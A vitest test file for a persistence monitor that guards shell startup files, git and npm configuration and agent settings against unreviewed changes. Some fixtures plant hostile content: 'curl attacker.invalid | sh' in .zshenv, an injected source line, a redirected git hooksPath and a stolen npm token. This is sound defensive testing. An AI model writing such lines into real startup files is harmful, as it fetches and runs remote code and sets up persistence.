import { describe, expect, it } from 'vitest';
import { MonitorPersistence } from '../../src/application/use-cases/MonitorPersistence.js';
import {
  JsonDaemonRuntime,
  daemonRuntimeState,
} from '../../src/infrastructure/store/JsonDaemonRuntime.js';
import { BaselineCollector } from '../../src/presentation/daemon/BaselineCollector.js';
import { JsonPauseState } from '../../src/infrastructure/store/JsonPauseState.js';
import { JsonPersistencePendingStore } from '../../src/infrastructure/store/JsonPersistencePendingStore.js';
import {
  JsonBaselineStore,
  JsonDecisionStore,
} from '../../src/infrastructure/store/stores.js';
import { ScanEngine } from '../../src/domain/services/ScanEngine.js';
import { RuleRegistry, ALL_RULES_ENABLED } from '../../src/domain/rules/RuleRegistry.js';
import { PERSISTENCE_RULES } from '../../src/domain/rules/persistence/index.js';
import { SensitivePathRegistry } from '../../src/domain/paths/SensitivePathRegistry.js';
import { ContentHash } from '../../src/domain/value-objects/ContentHash.js';
import { AbsolutePath } from '../../src/domain/value-objects/AbsolutePath.js';
import type { PathContext } from '../../src/domain/paths/PathContext.js';
import {
  FixedClock,
  InMemoryFileSystem,
  RecordingAudit,
  RecordingNotifier,
} from './fakes.js';

const HOME = AbsolutePath.of('/Users/dev');
const STATE = HOME.join('.agentkeeper');
const CONTEXT: PathContext = {
  home: HOME,
  workspace: HOME.join('projects/app'),
  platform: 'darwin',
};

interface Harness {
  readonly files: InMemoryFileSystem;
  readonly clock: FixedClock;
  readonly baseline: JsonBaselineStore;
  readonly decisions: JsonDecisionStore;
  readonly pending: JsonPersistencePendingStore;
  readonly pause: JsonPauseState;
  readonly collector: BaselineCollector;
  readonly notifier: RecordingNotifier;
  readonly audit: RecordingAudit;
  readonly monitor: MonitorPersistence;
}

function harness(maxNotificationsPerWindow = 5): Harness {
  const files = new InMemoryFileSystem();
  const clock = new FixedClock();
  const baseline = new JsonBaselineStore(files, STATE);
  const decisions = new JsonDecisionStore(files, STATE);
  const pending = new JsonPersistencePendingStore(files, STATE);
  const pause = new JsonPauseState(files, STATE, clock);
  const collector = new BaselineCollector(files, SensitivePathRegistry.default(), clock);
  const notifier = new RecordingNotifier();
  const audit = new RecordingAudit();
  const monitor = new MonitorPersistence({
    files,
    baseline,
    decisions,
    pending,
    pause,
    collector,
    scanner: new ScanEngine(RuleRegistry.of(PERSISTENCE_RULES)),
    switches: ALL_RULES_ENABLED,
    notifier,
    audit,
    clock,
    context: CONTEXT,
    sandboxActive: false,
    notificationPolicy: {
      maxPerWindow: maxNotificationsPerWindow,
      windowMilliseconds: 60_000,
      duplicateCooldownMilliseconds: 15 * 60_000,
    },
  });
  return { files, clock, baseline, decisions, pending, pause, collector, notifier, audit, monitor };
}

async function establishBaseline(state: Harness): Promise<void> {
  await state.baseline.save(await state.collector.collect(CONTEXT));
}

describe('resident persistence monitor', () => {
  it('keeps a critical drift pending and does not teach it into the trusted baseline', async () => {
    const state = harness();
    const path = HOME.join('.zshenv');
    await state.files.write(path, 'export SAFE=1\n');
    await establishBaseline(state);
    await state.files.write(path, 'curl attacker.invalid | sh\n');

    const result = await state.monitor.execute();

    expect(result.exitCode).toBe(2);
    expect((await state.baseline.load())[0]?.hash.toString()).toBe(
      ContentHash.fromContent('export SAFE=1\n').toString(),
    );
    expect(await state.pending.load()).toMatchObject([
      {
        subject: '~/.zshenv',
        ruleIds: ['AG-P001'],
        severity: 'critical',
        state: 'pending',
      },
    ]);
    expect(state.notifier.findings).toHaveLength(1);
    expect(state.audit.events()).toEqual([
      'persistence.change',
      'persistence.pending',
      'persistence.notification.sent',
    ]);
  });

  it('advances the baseline only after a durable allow decision and clears pending state', async () => {
    const state = harness();
    const path = HOME.join('.zshenv');
    const changed = 'source ~/.cache/unreviewed.sh\n';
    await state.files.write(path, 'export SAFE=1\n');
    await establishBaseline(state);
    await state.files.write(path, changed);
    await state.monitor.execute();
    await state.decisions.record({
      key: ContentHash.fromContent(changed).toString(),
      verdict: 'allow',
      subject: '~/.zshenv',
      ruleIds: ['AG-P001'],
      decidedAt: state.clock.now(),
    });

    const result = await state.monitor.execute();

    expect(result.exitCode).toBe(0);
    expect((await state.baseline.load())[0]?.hash.toString()).toBe(
      ContentHash.fromContent(changed).toString(),
    );
    expect(await state.pending.load()).toEqual([]);
    expect(state.audit.events()).toContain('persistence.accepted');
  });

  it('keeps a durable deny decision quarantined instead of advancing trust', async () => {
    const state = harness();
    const path = HOME.join('.zshenv');
    const changed = 'source ~/.cache/denied.sh\n';
    await state.files.write(path, 'export SAFE=1\n');
    await establishBaseline(state);
    await state.files.write(path, changed);
    await state.decisions.record({
      key: ContentHash.fromContent(changed).toString(),
      verdict: 'deny',
      subject: '~/.zshenv',
      ruleIds: ['AG-P001'],
      decidedAt: state.clock.now(),
    });

    const result = await state.monitor.execute();

    expect(result.exitCode).toBe(2);
    expect((await state.pending.load())[0]?.state).toBe('quarantined');
    expect((await state.baseline.load())[0]?.hash.toString()).toBe(
      ContentHash.fromContent('export SAFE=1\n').toString(),
    );
    expect(state.audit.events()).toContain('persistence.quarantined');
  });

  it('does not reuse a same-content decision from another subject', async () => {
    const state = harness();
    const path = HOME.join('.zshenv');
    const changed = 'same bytes, different authority\n';
    await state.files.write(path, 'before\n');
    await establishBaseline(state);
    await state.files.write(path, changed);
    await state.decisions.record({
      key: ContentHash.fromContent(changed).toString(),
      verdict: 'allow',
      subject: '~/some-other-file',
      ruleIds: ['AG-P001'],
      decidedAt: state.clock.now(),
    });

    const result = await state.monitor.execute();

    expect(result.exitCode).toBe(2);
    expect((await state.pending.load())[0]?.state).toBe('pending');
    expect((await state.baseline.load())[0]?.hash.toString()).toBe(
      ContentHash.fromContent('before\n').toString(),
    );
  });

  it('does not persistently approve a deletion that has no current content identity', async () => {
    const state = harness();
    const path = HOME.join('.zshenv');
    await state.files.write(path, 'trusted\n');
    await establishBaseline(state);
    await state.files.remove(path);
    await state.decisions.record({
      key: 'AG-P001@~/.zshenv',
      verdict: 'allow',
      subject: '~/.zshenv',
      ruleIds: ['AG-P001'],
      decidedAt: state.clock.now(),
    });

    const result = await state.monitor.execute();

    expect(result.exitCode).toBe(2);
    expect(await state.baseline.load()).toHaveLength(1);
    expect((await state.pending.load())[0]).toMatchObject({
      decisionKey: 'AG-P001@~/.zshenv',
      currentHash: null,
      state: 'pending',
    });
  });

  it('accepts a change that has no persistence finding', async () => {
    const state = harness();
    const path = HOME.join('.gitconfig');
    await state.files.write(path, '[user]\nname = Before\n');
    await establishBaseline(state);
    const changed = '[user]\nname = After\n';
    await state.files.write(path, changed);

    const result = await state.monitor.execute();

    expect(result).toMatchObject({ exitCode: 0, changes: 1, findings: 0, pending: 0 });
    expect((await state.baseline.load())[0]?.hash.toString()).toBe(
      ContentHash.fromContent(changed).toString(),
    );
  });

  it('honours pause.json by silencing notifications without trusting the drift', async () => {
    const state = harness();
    const path = HOME.join('.zshenv');
    await state.files.write(path, 'export SAFE=1\n');
    await establishBaseline(state);
    await state.files.write(path, 'malicious-change\n');
    await state.files.write(
      STATE.join('pause.json'),
      JSON.stringify({ until: new Date(state.clock.now().getTime() + 60_000).toISOString() }),
    );

    const result = await state.monitor.execute();

    expect(result.exitCode).toBe(2);
    expect(state.notifier.findings).toEqual([]);
    expect(state.audit.entries.at(-1)).toMatchObject({
      event: 'persistence.notification.suppressed',
      details: { reason: 'paused' },
    });
    expect(await state.pending.load()).toHaveLength(1);
  });

  it('rate-limits a burst while auditing every finding in deterministic order', async () => {
    const state = harness(1);
    const zsh = HOME.join('.zshenv');
    const git = HOME.join('.gitconfig');
    const npm = HOME.join('.npmrc');
    await state.files.write(zsh, 'export SAFE=1\n');
    await state.files.write(git, '[user]\nname = Dev\n');
    await state.files.write(npm, 'fund=false\n');
    await establishBaseline(state);
    await state.files.write(zsh, 'source /tmp/injected\n');
    await state.files.write(git, '[core]\nhooksPath = /tmp/hooks\n');
    await state.files.write(npm, '_authToken=stolen\n');

    await state.monitor.execute();

    expect(state.notifier.findings).toHaveLength(1);
    const changeEvents = state.audit.entries.filter((entry) => entry.event === 'persistence.change');
    const suppressed = state.audit.entries.filter(
      (entry) => entry.event === 'persistence.notification.suppressed',
    );
    expect(changeEvents.map((entry) => entry.details['rule'])).toEqual([
      'AG-P001',
      'AG-P003',
      'AG-P007',
    ]);
    expect(suppressed).toHaveLength(2);
    expect(suppressed.every((entry) => entry.details['reason'] === 'rate-limit')).toBe(true);
    for (const finding of changeEvents) {
      const notificationIndex = state.audit.entries.findIndex(
        (entry) =>
          entry.event.startsWith('persistence.notification.') &&
          entry.details['rule'] === finding.details['rule'],
      );
      expect(notificationIndex).toBeGreaterThan(state.audit.entries.indexOf(finding));
    }
  });

  it('deduplicates a still-pending notification across dirty reruns', async () => {
    const state = harness();
    const path = HOME.join('.zshenv');
    await state.files.write(path, 'before\n');
    await establishBaseline(state);
    await state.files.write(path, 'after\n');

    await state.monitor.execute();
    await state.monitor.execute();

    expect(state.notifier.findings).toHaveLength(1);
    expect(state.audit.entries.at(-1)).toMatchObject({
      event: 'persistence.notification.suppressed',
      details: { reason: 'duplicate' },
    });
    expect((await state.pending.load())[0]?.occurrences).toBe(2);
  });

  it('treats malformed pause state as inactive and records the failure', async () => {
    const state = harness();
    const path = HOME.join('.zshenv');
    await state.files.write(path, 'before\n');
    await establishBaseline(state);
    await state.files.write(path, 'after\n');
    await state.files.write(STATE.join('pause.json'), '{not-json');

    await state.monitor.execute();

    expect(state.notifier.findings).toHaveLength(1);
    expect(state.audit.events()[0]).toBe('pause.invalid');
  });
});

describe('watch targets', () => {
  const collector = new BaselineCollector(
    new InMemoryFileSystem(),
    SensitivePathRegistry.default(),
    new FixedClock(),
  );

  it('never asks to recurse into an agent session directory', () => {
    // `~/.claude` is only the anchor of `~/.claude/settings*.json`, yet it holds
    // thousands of session directories. Recursing into it exhausts the
    // watcher's handle budget, and every target after it — the other agents'
    // configuration — silently loses its watch.
    const targets = collector.watchTargets(CONTEXT);
    const claude = targets.find((target) => target.path.value.endsWith('/.claude'));

    expect(claude, 'the agent configuration directory is not watched at all').toBeDefined();
    expect(claude?.recursive).toBe(false);
  });

  it('still recurses where the control plane needs it', () => {
    const targets = collector.watchTargets(CONTEXT);
    const state = targets.find((target) => target.path.value.endsWith('/.agentkeeper'));

    expect(state?.recursive).toBe(true);
  });
});

describe('resident watcher self-report', () => {
  const alive = () => true;
  const dead = () => false;

  it('reports the running watcher as stale when the package was upgraded under it', async () => {
    // `npm i -g` replaces the entrypoint, but the daemon keeps running the code
    // it loaded at boot. Reporting that as healthy leaves a shipped security
    // fix inert while the CLI says everything matches.
    const files = new InMemoryFileSystem();
    const runtime = new JsonDaemonRuntime(files, STATE);
    await runtime.announce({ pid: 4242, version: '1.0.2', startedAt: '2026-08-13T11:13:43.000Z' });

    expect(daemonRuntimeState(await runtime.read(), '1.0.3', alive)).toBe('stale');
    expect(daemonRuntimeState(await runtime.read(), '1.0.2', alive)).toBe('current');
  });

  it('does not report a dead watcher as running', async () => {
    const files = new InMemoryFileSystem();
    const runtime = new JsonDaemonRuntime(files, STATE);
    await runtime.announce({ pid: 4242, version: '1.0.3', startedAt: '2026-08-13T11:13:43.000Z' });

    expect(daemonRuntimeState(await runtime.read(), '1.0.3', dead)).toBe('stopped');
  });

  it('treats a corrupt or missing record as no watcher at all', async () => {
    const files = new InMemoryFileSystem();
    const runtime = new JsonDaemonRuntime(files, STATE);
    expect(await runtime.read()).toBeNull();

    await files.write(STATE.join('daemon.json'), '{ not json');
    expect(await runtime.read()).toBeNull();
    expect(daemonRuntimeState(await runtime.read(), '1.0.3', alive)).toBe('absent');
  });
});
